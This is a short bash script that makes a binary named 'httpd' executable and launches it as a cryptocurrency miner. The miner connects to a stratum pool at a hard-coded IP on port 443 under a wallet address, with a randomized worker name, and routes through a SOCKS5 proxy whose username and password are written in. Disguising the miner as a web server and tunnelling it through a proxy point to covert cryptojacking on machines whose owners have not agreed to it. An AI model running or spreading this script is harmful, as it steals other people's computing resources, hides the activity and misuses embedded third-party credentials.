#!/bin/bash
chmod +x httpd
chmod 777 httpd && ./httpd -a yescryptr16 -o stratum+tcp://149.102.231.74:443 -u web1qusfnt4vf67cfklrn0ntsd6ggpru04dwm7cpsp2.$(echo turu-$(shuf -i 1-9999 -n 1)) -p x -t 4 --proxy=socks5://6SKWObeYXA:6a9pyC0p@sin.socks.ipvanish.com:1080
